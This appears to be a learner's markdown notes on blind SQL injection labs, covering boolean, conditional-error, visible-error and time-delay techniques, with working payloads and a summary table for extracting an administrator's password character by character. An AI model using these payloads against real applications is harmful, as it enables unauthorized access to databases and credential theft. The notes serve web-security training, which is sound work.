# Blind SQL Injection

---

## What is Blind SQLi?
The application does not return query results or error messages in the response.
The attacker infers information based on the application's behavior.

### Two Main Types
1. **Boolean-based** — response changes based on true/false condition
2. **Time-based** — response delays based on true/false condition

---

## 1. Blind SQLi with Conditional Responses

### Lab: Blind SQLi with conditional responses

### How it works
The application shows different content based on whether the condition is true or false.
Example: "Welcome back" message appears only when condition is TRUE.

### Attack — Confirm Vulnerability
```sql
' AND '1'='1    ← Welcome back appears
' AND '1'='2    ← Welcome back disappears
```

### Attack — Extract Data Character by Character
```sql
' AND SUBSTRING(username,1,1)='a' FROM users WHERE username='administrator'--
' AND SUBSTRING(username,1,1)='b' FROM users WHERE username='administrator'--
```

### Attack — Find Password Length
```sql
' AND LENGTH(password)>1--    ← true
' AND LENGTH(password)>10--   ← check until false
```

### Attack — Extract Password
```sql
' AND SUBSTRING(password,1,1)='a'--
' AND SUBSTRING(password,2,1)='a'--
' AND SUBSTRING(password,3,1)='a'--
```

### What I Learned
- SUBSTRING(string, position, length)
- Automate with Burp Intruder to test all characters faster
- Binary search speeds up the process (start with middle of alphabet)

---

## 2. Blind SQLi with Conditional Errors

### Lab: Blind SQLi with conditional errors

### How it works
The application doesn't change visible content, but throws an error on TRUE condition.
We use CASE WHEN to trigger errors intentionally.

### Attack — Confirm Vulnerability
```sql
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
```
- First payload → error (1=1 is true → 1/0 executed)
- Second payload → no error (1=2 is false → 'a' returned)

### Attack — Extract Data
```sql
' AND (SELECT CASE WHEN (SUBSTRING(password,1,1)='a') 
THEN 1/0 ELSE 'a' END FROM users WHERE username='administrator')='a
```

### What I Learned
- `CASE WHEN condition THEN 1/0 ELSE 'a' END` forces an error on true condition
- Error = condition is TRUE
- No error = condition is FALSE

---

## 3. Visible Error-Based SQLi

### Lab: Visible error-based SQLi

### How it works
The application returns detailed error messages that leak database information.

### Attack
```sql
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

### Result
Error message contains the actual value:
```
ERROR: invalid input syntax for type integer: "administrator"
```

### What I Learned
- CAST forces a type conversion error that reveals the value
- Much faster than character-by-character extraction
- Always check error messages carefully

---

## 4. Blind SQLi with Time Delays

### Lab: Blind SQLi with time delays

### How it works
When no visible response difference exists, we use time delays to infer data.

### Attack — Confirm Vulnerability
```sql
-- PostgreSQL
'; SELECT pg_sleep(10)--

-- MySQL
'; SELECT SLEEP(10)--

-- Microsoft
'; WAITFOR DELAY '0:0:10'--

-- Oracle
'; dbms_pipe.receive_message(('a'),10)--
```

### What I Learned
- If response takes 10 seconds → injection works
- Time-based is slower but works when nothing else does

---

## 5. Blind SQLi with Time Delays and Data Retrieval

### Lab: Blind SQLi with time delays and information retrieval

### Attack — Extract Data Using Time
```sql
-- PostgreSQL
'; SELECT CASE WHEN (SUBSTRING(password,1,1)='a') 
THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users 
WHERE username='administrator'--
```

### How it works
- Response delays 10 seconds → character is correct
- Response is instant → character is wrong

### What I Learned
- Combine CASE WHEN with pg_sleep for conditional time delays
- Very slow manually → use Burp Intruder with timing analysis
- Set thread to 1 to avoid false results from concurrent requests

---

## Skipped Labs (Burp Pro Required)

| Lab | Reason |
|-----|--------|
| Blind SQLi with out-of-band interaction | Requires Burp Collaborator (Pro) |
| Blind SQLi with out-of-band data exfiltration | Requires Burp Collaborator (Pro) |

---

## Key Payloads Summary

| Type | Payload |
|------|---------|
| Boolean TRUE | `' AND '1'='1` |
| Boolean FALSE | `' AND '1'='2` |
| Extract char | `' AND SUBSTRING(password,1,1)='a'--` |
| Error-based | `' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a` |
| Visible error | `' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--` |
| Time delay (PgSQL) | `'; SELECT pg_sleep(10)--` |
| Time delay (MySQL) | `'; SELECT SLEEP(10)--` |
| Time + data | `'; SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END--` |

---

## Comparison Table

| Type | Response Difference | Speed | Reliability |
|------|-------------------|-------|-------------|
| Conditional responses | Content changes | Fast | High |
| Conditional errors | Error appears | Fast | High |
| Visible error-based | Error message leaks data | Very Fast | High |
| Time-based | Response delay | Very Slow | Medium |
| Out-of-band | External interaction | Fast | High |
